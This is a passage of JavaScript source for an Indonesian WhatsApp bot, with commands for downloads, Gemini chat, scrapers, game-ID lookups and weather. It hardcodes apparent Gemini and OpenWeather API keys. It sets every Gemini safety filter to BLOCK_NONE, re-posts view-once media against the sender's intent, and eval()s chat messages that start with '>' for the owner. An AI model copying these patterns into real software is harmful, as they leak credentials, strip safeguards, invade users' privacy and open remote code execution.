                if(jodohKu && jodohKu.result){
                    const {image, positif, negatif, deskripsi} = jodohKu.result;
                    AnanthaGanz.sendMessage(
                    m.chat, 
                    {
                        image: {url: image},
                        caption:
                        `*Sisi Positif* : ${positif}\n` +
                        `*Sisi Negatif* : ${negatif}\n\n` +
                        `*Deskripsi* : ${deskripsi}`,
                    }
                    )
                }
                } catch (e){
                    reply('limit / error script silahkan cek panel')
                }
            }
            break;
            case 'ytmp4' : {
                if(!q) return reply('Linknya mana bang?')
              // reply('bntr bang lagi proses');
            
                 const {title, video, author, description, duration, views, upload, thumbnail} = await ytmp4(q);
                /*
                 const messageLink =
                  `╭───【 *Result* 】\n` +
                  `│➠ *Title* : ${title}\n` +
                  `│➠ *Author* : ${author}\n` +
                  `│➠ *Durasi* : ${duration}\n` +
                  `│➠ *Views* : ${views}\n` +
                  `╰───【 *IDSHOPKU* 】`
                  */
                 // console.log(video)
                 await AnanthaGanz.sendMessage(
                    m.chat,
                     {
                         video: { url: video },
                         // caption: messageLink,
                         mimetype: "video/mp4"
                     }
                 )
            }
                break;                
            case 'ytmp3' : {
                if(!q) return reply('Linknya mana bang?')
               reply('bntr bang lagi proses');
           
                 const {title, audio, author, description, duration, views, upload, thumbnail} = await ytmp3(q);
               
                 console.log(audio)
                 await AnanthaGanz.sendMessage(
                    m.chat,
                     {
                         audio: { url: audio },
                         // caption: 'nih',
                         mimetype: "audio/mp4"
                     }, 
                 )
            }
                break;               
case 'lz': {
  if(!q) return reply('mau nanya apa kamu hah !?');
  let apikey = 'AIzaSyAmfM6F0gbK8GoMbrGh63ACcDpBoMKtoSM'
  const generationConfig = {
    temperature: 2,
    topP: 0.95,
    topK: 64,
    maxOutputTokens: 8192,
    responseMimeType: "text/plain",
  };
  const safetySettings = [
    {
      category: HarmCategory.HARM_CATEGORY_HARASSMENT,
      threshold: HarmBlockThreshold.BLOCK_NONE,
    },
    {
      category: HarmCategory.HARM_CATEGORY_HATE_SPEECH,
      threshold: HarmBlockThreshold.BLOCK_NONE,
    },
    {
      category: HarmCategory.HARM_CATEGORY_SEXUALLY_EXPLICIT,
      threshold: HarmBlockThreshold.BLOCK_NONE,
    },
    {
      category: HarmCategory.HARM_CATEGORY_DANGEROUS_CONTENT,
      threshold: HarmBlockThreshold.BLOCK_NONE,
    },
  ];

  const genAI = new GoogleGenerativeAI(apikey);
  const model = genAI.getGenerativeModel({ model: "gemini-1.5-flash-latest", generationConfig, safetySettings });

  const prompt = `lu adalah bot LC, jadi tolong balas/jawab pesan ini dalam logat mbak mbak LC: ${q}`;

  try {
    const result = await model.generateContent(prompt);
    const aiResponse = result.response.text();
    reply(aiResponse);
  } catch (err) {
    if (err.status === 429) {
      return reply('❌ Limit harian penggunaan AI Google Gemini sudah tercapai!\nCoba lagi besok, atau upgrade quota API-mu.');
    } else {
      return reply('❌ Terjadi error saat memproses permintaan AI. Silakan coba lagi nanti.');
    }
  }
}
break;
            case 'ai' : {
                if(!q) return reply('mau nanya apa?');
                let apikey = 'AIzaSyAmfM6F0gbK8GoMbrGh63ACcDpBoMKtoSM'
                 const generationConfig = {
                        temperature: 2,
                        topP: 0.95,
                        topK: 64,
                        maxOutputTokens: 8192,
                        responseMimeType: "text/plain",
                    };
                const genAI = new GoogleGenerativeAI(apikey);
                const model = genAI.getGenerativeModel({ model: "gemini-1.5-pro-001", generationConfig });

                // const prompt = "Write a story about a magic backpack.";

                const result = await model.generateContent(q);
                // console.log(result.response.text());
                const aiResponse = result.response.text();
                reply(aiResponse)
            }
                break;           
                
                
            case 'kurs': {
              if (!m.isGroup) return m.reply('*Fitur khusus group !*');
            try {
                let response = await fetch('https://www.bi.go.id/id/statistik/informasi-kurs/transaksi-bi/default.aspx', {
                     headers: {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                    }
                });
                let $ = cheerio.load(await response.text());
                let result = [], uang = [];
                for (let i = 0; i < 25; i++) {
                    let data = $('#exampleModal > div > div > div.modal-body > table > tbody > tr').eq(i).find('td');
                    let singkatan_mata_uang = $(data).eq(0).text();
                    let kepanjangan_mata_uang = $(data).eq(1).text();
                    uang.push({ singkatan_mata_uang, kepanjangan_mata_uang });
                }
                for (let i = 0; i < 25; i++) {
                    let data = $('#ctl00_PlaceHolderMain_g_6c89d4ad_107f_437d_bd54_8fda17b556bf_ctl00_GridView1 > table > tbody > tr').eq(i).find('td');
                    let mata_uang = $(data).eq(0).text().trim();
                    let _nama_mata_uang = uang.find(v => new RegExp(mata_uang, 'g').test(v.singkatan_mata_uang)) || {};
                    let nama_mata_uang = (_nama_mata_uang.kepanjangan_mata_uang || '').trim();
                    result.push({
                        mata_uang,
                        nama_mata_uang,
                        kurs_beli: $(data).eq(2).text(),
                        kurs_jual: $(data).eq(3).text(),
                    });
                }
                const filePath = './database/kurs.json';
                await fs.writeFileSync(filePath, JSON.stringify(result, null, 2));
                // reply('Bentar ya, sedang mengambil data kurs...');
                const kursData = JSON.parse(fs.readFileSync(filePath, 'utf8'));
                if (kursData && kursData.length > 0) {
                    const pesan = kursData.map((item, index) => {
                        return `Mata Uang: ${item.mata_uang}\nNama Uang: ${item.nama_mata_uang}\nKurs Beli: ${formatRupiah(item.kurs_beli)}\nKurs Jual: ${formatRupiah(item.kurs_jual)}`;
                    }).join("\n-------------------------------\n");
                    reply(pesan);
                } else {
                    reply('Data kurs tidak tersedia.');
                }
            } catch (error) {
                console.error('Terjadi kesalahan:', error);
                reply('Maaf, terjadi kesalahan saat mengambil data kurs.');
            }
        }
        break;
            case 'gempa': {
              if (!m.isGroup) return m.reply('*Fitur khusus group !*');
                try {
                     let response = await fetch('https://www.bmkg.go.id/gempabumi/gempabumi-dirasakan')
                      let $ = cheerio.load(await response.text())
                      let result = []
                      for (let i = 0; i < 20; i++) {
                        let data = $('#__nuxt > main > div > div > div:nth-child(3) > div > div > table > tbody > tr').eq(i).find('td')
                        let waktu = $(data).eq(1).html().replace(/<br>/g, ' ').trim()
                        let lintang = $(data).eq(4).text().replace('-', ' ').replace(',','.').split(' ').slice(0, 2).join(' ')
                        let bujur = $(data).eq(4).text().replace('-', ' ').split(' ').slice(2, 4).join(' ').replace(',','.')
                        console.log(bujur)
                        let magnitudo = $(data).eq(2).text().trim()
                        let kedalaman = $(data).eq(3).text().trim()
                        let wilayah = $(data).eq(5).find('div').first().contents().filter(function () {return this.nodeType === 3;}).text().trim();
                        let warning_elements = $(data).eq(5).find('div.flex.flex-wrap.gap-[6px]').children();
                        let warning = [];
                        warning_elements.each(function () {
                            let text = $(this).find("div").text().trim();
                            if (text) warning.push(text);
                        });
                          console.log(warning)
                        result.push({
                          waktu, 
                          lintang, 
                          bujur,
                          magnitudo,
                          kedalaman,
                          wilayah,
                          warning,
                        })
                      }
                      const filePath = './database/gempa.json';
                      await fs.writeFileSync(filePath, JSON.stringify(result, null, 2))
                     const gempaData = JSON.parse(fs.readFileSync(filePath, 'utf8'));
                if (gempaData && gempaData.length > 0) {
                    const pesan = gempaData.map((item, index) => {
                        const la = item.lintang.replace(' LU', '').replace(' LS', '');
                        const lo = item.bujur.replace(' BT', '').replace(' BB', '');
                        return `*Waktu* : ${item.waktu}\n*Lokasi* : https://www.google.com/maps?q=${la},${lo}\n*Kekuatan* : ${item.magnitudo} M\n*Wilayah* : ${item.wilayah}\n*Warning* : \n${item.warning.map((warn) => `- ${warn}`).join('\n')}`;
                    }).join("\n-------------------------------\n");
                    reply(pesan);
                } else {
                    reply('Data gempa tidak tersedia.');
                }
                } catch (error) {
                console.error('Terjadi kesalahan:', error);
                reply('Maaf, terjadi kesalahan saat mengambil data gempa.');
            }
                break;
            }
                // Fun
                case 'bucin': {
                    try {
           
                        const bucinData = JSON.parse(fs.readFileSync('./database/kata_bucin.json', 'utf-8'));
                        if (Array.isArray(bucinData) && bucinData.length > 0) {
                            const randomIndex = Math.floor(Math.random() * bucinData.length);
                            const bucinMessage = bucinData[randomIndex];
                            reply(bucinMessage);
                        } else {
                            reply('Tidak ada data bucin yang ditemukan.');
                        }
                    } catch (error) {
                        console.error('Error membaca atau memproses kata_bucin.json:', error.message);
                        reply('Terjadi kesalahan saat mengambil kata-kata bucin.');
                    }
                }
                break;
                case 'truth': {
                    try {
           
                        const truthData = JSON.parse(fs.readFileSync('./database/truth.json', 'utf-8'));
                        if (Array.isArray(truthData) && truthData.length > 0) {
                            const randomIndex = Math.floor(Math.random() * truthData.length);
                            const truthMessage = truthData[randomIndex];
                            reply(truthMessage);
                        } else {
                            reply('Tidak ada data truth yang ditemukan.');
                        }
                    } catch (error) {
                        console.error('Error membaca atau memproses truth.json:', error.message);
                        reply('Terjadi kesalahan saat mengambil data truth.');
                    }
                }
                break;
                case 'dare': {
                    try {
           
                        const dareData = JSON.parse(fs.readFileSync('./database/dare.json', 'utf-8'));
                        if (Array.isArray(dareData) && dareData.length > 0) {
                            const randomIndex = Math.floor(Math.random() * dareData.length);
                            const dareMesssage = dareData[randomIndex];
                            reply(dareMesssage);
                        } else {
                            reply('Tidak ada data dare yang ditemukan.');
                        }
                    } catch (error) {
                        console.error('Error membaca atau memproses dare.json:', error.message);
                        reply('Terjadi kesalahan saat mengambil data dare.');
                    }
                }
                break;
                
                // Mediasi 
                case 'renungan': {
                  if (!m.isGroup) return m.reply('*Fitur khusus group !*');
                    try {
           
                        const renunganData = JSON.parse(fs.readFileSync('./database/renungan.json', 'utf-8'));
                        if (Array.isArray(renunganData) && renunganData.length > 0) {
                            const randomIndex = Math.floor(Math.random() * renunganData.length);
                            const pesanRenungan = renunganData[randomIndex];
                            AnanthaGanz.sendMessage(m.chat, { image : { url: pesanRenungan}});
                        } else {
                            reply('Tidak ada data renungan yang ditemukan.');
                        }
                    } catch (error) {
                        console.error('Error membaca atau memproses renungan.json:', error.message);
                        reply('Terjadi kesalahan saat mengambil data renungan.');
                    }
                }
                break;
                case 'religi': {
                  if (!m.isGroup) return m.reply('*Fitur khusus group !*');
                    try {
           
                        const religiData = JSON.parse(fs.readFileSync('./database/religion.json', 'utf-8'));
                        if (Array.isArray(religiData) && religiData.length > 0) {
                            const randomIndex = Math.floor(Math.random() * religiData.length);
                            const religiMessage = religiData[randomIndex];
                            const { latin, arabic, translation_id, translation_en } = religiMessage
                            reply(`Bahasa latin : *${latin}*\nKaligrafi : *${arabic}*\nArti : *${translation_id}*`)
                        } else {
                            reply('Tidak ada data religi yang ditemukan.');
                        }
                    } catch (error) {
                        console.error('Error membaca atau memproses religion.json:', error.message);
                        reply('Terjadi kesalahan saat mengambil data religi.');
                    }
                }
                break;

                
case 'apatuh': {
  if (!m.isGroup) return m.reply('*Fitur khusus group !*');
    if (!isAdmins) return reply ('Only Group Admins')
                const fs = require('fs');
                const path = require('path');
                if (!m.quoted) return m.reply('Reply gambar/video yang ingin Anda lihat');
                if (m.quoted.mtype !== 'viewOnceMessageV2') return m.reply('Ini bukan pesan view-once.');

                try {
                    let msg = m.quoted.messages;
                    let type = Object.keys(msg)[0];
                    let mediaType = type === 'imageMessage' ? 'image' : 'video';

                    let media = await downloadContentFromMessage(msg[type], mediaType);
                    let buffer = Buffer.concat([]);

                    for await (const chunk of media) {
                        buffer = Buffer.concat([buffer, chunk]);
                    }
                    let tempFile = path.join(__dirname, `temp.${mediaType === 'image' ? 'jpg' : 'mp4'}`);
                    fs.writeFileSync(tempFile, buffer);
                    let options = mediaType === 'image'
                        ? { image: { url: tempFile }, caption: msg[type].caption || '' }
                        : { video: { url: tempFile }, caption: msg[type].caption || '' };

                    await AnanthaGanz.sendMessage(m.chat, options, { quoted: m });
                    fs.unlinkSync(tempFile);
                } catch (error) {
                    console.error(error);
                    m.reply('Terjadi kesalahan saat mencoba membuka pesan.');
                }
                break;
            }
case 'mlid1': {
  const [id, zone] = text.split(' ');
  if (!id || !zone) return reply('Contoh: .mlid 1381998620 15685');

  const axios = require('axios');

  try {
    // Fetch data First Topup
    const resTopup = await axios.get(`https://cekid.zannstore.com/v2/first-topup?api_req=idsAPITOLS&user_id=${id}&zone_id=${zone}`);
    if (resTopup.data.status !== 'success') return reply(`❌ Gagal ambil First Topup: ${resTopup.data.msg}`);
    const topup = resTopup.data;


    // Format First Topup Diamond
    const diamondList = (topup.first_topup || []).map(item => {
      const icon = item.status === 'Active' ? '✅' : '❌';
      return `• ${item.denom} ${icon}`;
    }).join('\n') || 'Tidak ada data';



    const output = `
🌀 *Cek MLBB ID (First Topup + Naruto)*

👤 *Nickname* : ${topup.nickname}
🆔 *ID / Zone* : ${topup.id} / ${topup.zone}
🌍 *Region* : ${topup.country} ${topup.country_flag}

━━━━━━━━━━━━━━━
💎 *First Topup Status:*
${diamondList}
    `.trim();

    reply(output);
  } catch (e) {
    console.error(e);
    reply('❌ Terjadi kesalahan saat memproses.');
  }
}
break;
case 'mlid2': {
  const [id, zone] = text.split(' ');
  if (!id || !zone) return reply('Contoh: .mlid2 1381998620 15685');

  const axios = require('axios');

  try {
    const resDouble = await axios.get(`https://cekid.zannstore.com/v2/doubel-moth?api_req=idsAPITOLS&user_id=${id}&zone_id=${zone}`);
    if (resDouble.data.status !== 'success') return reply(`❌ Gagal ambil data: ${resDouble.data.msg}`);
    const double = resDouble.data;

    const doubleList = (double.data_info || []).map(item => {
      const icon = item.status === 'Active' ? '✅' : '❌';
      return `• ${item.denom} ${icon}`;
    }).join('\n') || 'Tidak ada data.';

    const output = `
🌀 *Cek Double Moth MLBB*

👤 *Nickname* : ${double.nickname}
🆔 *ID / Zone* : ${double.id} / ${double.zone}
🌍 *Region* : ${double.country} ${double.country_flag}

━━━━━━━━━━━━━━━
🪙 *Double Moth Status:*
${doubleList}
    `.trim();

    reply(output);
  } catch (e) {
    console.error(e);
    reply('❌ Terjadi kesalahan saat memproses data.');
  }
}
break;
case 'mlid3': {
  const [id, zone] = text.split(' ');
  if (!id || !zone) return reply('Contoh: .mlid3 1381998620 15685');

  const axios = require('axios');

  try {
    const resNaruto = await axios.get(`https://cekid.zannstore.com/v2/naruto-mlbb?api_req=idsAPITOLS&user_id=${id}&zone_id=${zone}`);
    if (resNaruto.data.status !== 'success') return reply(`❌ Gagal ambil data Naruto: ${resNaruto.data.msg}`);
    const naruto = resNaruto.data;

    const narutoList = (naruto.data_info || []).map(item => {
      const icon = item.status === 'Active' ? '✅' : '❌';
      return `• ${item.denom} ${icon}`;
    }).join('\n') || 'Tidak ada data.';

    const output = `
🌀 *Cek Tiket Naruto MLBB*

👤 *Nickname* : ${naruto.nickname}
🆔 *ID / Zone* : ${naruto.id} / ${naruto.zone}
🌍 *Region* : ${naruto.country} ${naruto.country_flag}

━━━━━━━━━━━━━━━
🎟️ *Tiket Naruto:*
${narutoList}
    `.trim();

    reply(output);
  } catch (e) {
    console.error(e);
    reply('❌ Terjadi kesalahan saat memproses data.');
  }
}
break;
case 'mlid': {
  if (!m.isGroup) return m.reply('*Fitur khusus group !*');
  const [id, zone] = text.split(' ');
  if (!id || !zone) return reply('Contoh: .mlidall 1381998620 15685');

  const axios = require('axios');

  try {
    const [resTopup, resDouble, resNaruto] = await Promise.all([
      axios.get(`https://cekid.zannstore.com/v2/first-topup?api_req=idsAPITOLS&user_id=${id}&zone_id=${zone}`),
      axios.get(`https://cekid.zannstore.com/v2/doubel-moth?api_req=idsAPITOLS&user_id=${id}&zone_id=${zone}`),
      axios.get(`https://cekid.zannstore.com/v2/naruto-mlbb?api_req=idsAPITOLS&user_id=${id}&zone_id=${zone}`)
    ]);

    if (resTopup.data.status !== 'success') return reply(`❌ Gagal ambil First Topup: ${resTopup.data.msg}`);
    if (resDouble.data.status !== 'success') return reply(`❌ Gagal ambil Double Moth: ${resDouble.data.msg}`);
    if (resNaruto.data.status !== 'success') return reply(`❌ Gagal ambil Tiket Naruto: ${resNaruto.data.msg}`);

    const topup = resTopup.data;
    const double = resDouble.data;
    const naruto = resNaruto.data;

    const diamondList = (topup.first_topup || []).map(item => `• ${item.denom} ${item.status === 'Active' ? '✅' : '❌'}`).join('\n') || 'Tidak ada data';
    const doubleList = (double.data_info || []).map(item => `• ${item.denom} ${item.status === 'Active' ? '✅' : '❌'}`).join('\n') || 'Tidak ada data';
    const narutoList = (naruto.data_info || []).map(item => `• ${item.denom} ${item.status === 'Active' ? '✅' : '❌'}`).join('\n') || 'Tidak ada data';

    const output = `
🌀 *Cek MLBB Lengkap (FT + Double + Naruto)*

👤 *Nickname* : ${topup.nickname}
🆔 *ID / Zone* : ${topup.id} / ${topup.zone}
🌍 *Region* : ${topup.country} ${topup.country_flag}

━━━━━━━━━━━━━━━
💎 *First Topup:*
${diamondList}

🪙 *Double Moth:*
${doubleList}

🎟️ *Tiket Naruto:*
${narutoList}
    `.trim();

    reply(output);
  } catch (e) {
    console.error(e);
    reply('❌ Terjadi kesalahan saat mengambil data.');
  }
}
break;



case 'cuaca': {
  const axios = require('axios');
  const city = text.trim();
  const apikey = 'e2ca6b10ac43d7b84e41cb7f785d24b0';

  if (!city) return reply('Masukkan nama kota!\nContoh: .cuaca Jakarta');

  try {
    const res = await axios.get('https://api.openweathermap.org/data/2.5/weather', {
      params: {
        q: city,
        appid: apikey,
        units: 'metric',
        lang: 'id'
      }
    });

    const data = res.data;
    const namaKota = `${data.name}, ${data.sys.country}`;
    const kondisi = data.weather[0].description;
    const suhu = data.main.temp;
    const kelembaban = data.main.humidity;
    const angin = data.wind.speed;

    const hasil = `🌤️ *Cuaca di ${namaKota}*
Kondisi: ${kondisi}
Suhu: ${suhu}°C
Kelembaban: ${kelembaban}%
Angin: ${angin} m/s`;

    reply(hasil);
  } catch (err) {
    if (err.response && err.response.status === 404) {
      reply('Kota tidak ditemukan. Pastikan penulisan nama kota benar.');
    } else if (err.response && err.response.status === 401) {
      reply('API key tidak valid atau belum diaktifkan.');
    } else {
      reply('Terjadi kesalahan saat mengambil data cuaca.');
    }
  }

  break;
}
case 'sholat': {
    const axios = require('axios');
    const moment = require('moment-timezone');

    if (!text) return reply('Masukkan nama kota!\nContoh: .sholat surabaya');

    const city = text.trim();
    const today = moment().format('YYYY-MM-DD');

    try {
        const response = await axios.get(`https://api.aladhan.com/v1/timingsByCity`, {
            params: {
                city: city,
                country: 'Indonesia',
                method: 2
            }
        });

        const data = response.data.data;
        const jadwal = data.timings;
        const tanggal = data.date.readable;

        let teks = `🕌 *JADWAL SHOLAT ${city.toUpperCase()}*\n📅 ${tanggal}\n\n`;
        teks += `🕰 Subuh      : ${jadwal.Fajr}\n`;
        teks += `🌤 Dhuha      : ${jadwal.Sunrise}\n`;
        teks += `🏙 Dzuhur     : ${jadwal.Dhuhr}\n`;
        teks += `🌇 Ashar      : ${jadwal.Asr}\n`;
        teks += `🌆 Maghrib    : ${jadwal.Maghrib}\n`;
        teks += `🌃 Isya       : ${jadwal.Isha}\n`;

        reply(teks);

    } catch (err) {
        console.log(err);
        reply('Gagal mengambil data. Coba cek penulisan kota kamu.');
    }
    break;
}
                
case 'katakbbi': {
    const axios = require('axios');
    const cheerio = require('cheerio');

    if (!text) return reply("Contoh: .kbbisearch demokrasi");

    try {
        const res = await axios.get(`https://kbbi.kemdikbud.go.id/entri/${encodeURIComponent(text)}`);
        const $ = cheerio.load(res.data);

        const artiUtama = $('ol li').first().text().trim();
        if (!artiUtama) return reply("Kata tidak ditemukan di KBBI.");

        let hasil = `📚 *Hasil Pencarian: ${text}*\n\n`;
        $('ol li').each((i, el) => {
            hasil += `*${i + 1}.* ${$(el).text().trim()}\n`;
        });

        reply(hasil);
    } catch (err) {
        console.log(err);
        reply("Terjadi kesalahan saat mengakses data KBBI. Coba lagi nanti.");
    }

    break;
}

case 'antitag': {
  if (!m.isGroup) return reply('❌ Command ini hanya bisa digunakan di grup.');

  
  const path = './database/antitag.json';
  const mode = text.trim().toLowerCase();

  if (!['on', 'off'].includes(mode)) {
    return reply('❌ Format salah!\nContoh: .antitag on atau .antitag off');
  }

  // Baca atau buat file
  let data = {};
  if (fs.existsSync(path)) {
    try {
      data = JSON.parse(fs.readFileSync(path));
    } catch {
      data = {};
    }
  }

  // Update setting
  data[m.chat] = mode === 'on';
  fs.writeFileSync(path, JSON.stringify(data, null, 2));

  reply(`✅ Anti-tag grup *${mode.toUpperCase()}* untuk grup ini.`);
}
break;

const path = './database/antitag.json';

const isMentioningGroup = m.message?.extendedTextMessage?.contextInfo?.mentionedJid?.includes(m.chat);

let antitag = {};
if (fs.existsSync(path)) {
  try {
    antitag = JSON.parse(fs.readFileSync(path));
  } catch {
    antitag = {};
  }
}

if (m.isGroup && isMentioningGroup && antitag[m.chat]) {
  const senderTag = `@${m.sender.split('@')[0]}`;

  await AnanthaGanz.sendMessage(m.chat, {
    text: `⚠️ ${senderTag} jangan sesekali tag grup ini!`,
    mentions: [m.sender]
  });

  await AnanthaGanz.sendMessage(m.chat, {
    delete: {
      remoteJid: m.chat,
      fromMe: false,
      id: m.key.id,
      participant: m.key.participant || m.sender
    }
  });
}













case 'restart':

  //  if (!isCreator) return reply('Oops, kamu siapa?')
    if (!(m.isGroup? isAdmins : isCreator)) return m.reply('*fitur khusus admin & owner*')
    let restar = '*[ Notice ]* bot sedang dalam proses restart, harap untuk tidak mengirim perintah saat proses restart di lakukan, bot akan segera aktif kembali!'

    reply(restar);

    setTimeout(() => {

        process.exit(); // Menutup proses bot

    }, 5000); // Jeda lebih lama sebelum keluar

    break
  
            default:
                 if (budy) {
  const cleanedBudy = budy.replace(/[()\s]+/g, " ").trim();

  const match = cleanedBudy.match(/^(\d{0,})\s(\d{0,})$/); 
  if (match) {
    // Proses ZANNSTORE
    const userId = match[1]; 
    const zoneId = match[2];

    try {
      const response = await fetch(`https://cekid.zannstore.com/v2/region-ml?api_req=idsAPITOLS&user_id=${userId}&zone_id=${zoneId}`);
      const data = await response.json();

      if (data.status === "success") {
        const userData = data.data;
        const nicknameUser = userData.nickname || "Tidak ditemukan";
        const countryFlag = userData.country_flag || "✅";

        console.log("Request berhasil:", data);
        await AnanthaGanz.sendMessage(m.chat, { react: { text: countryFlag, key: m.key } });
      } else {
        console.log("Data tidak ditemukan atau status error:", data);
        await AnanthaGanz.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
      }
    } catch (error) {
      console.error('Error:', error);
      await AnanthaGanz.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
    }
  }
}
if (budy.startsWith('>')) {
                    if (!isCreator) return
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await m.reply(evaled)
                    } catch (err) {
                        await m.reply(util.format(err))
                    }
                }
       }
        
    } catch (err) {
        m.reply(util.format(err))
    }
}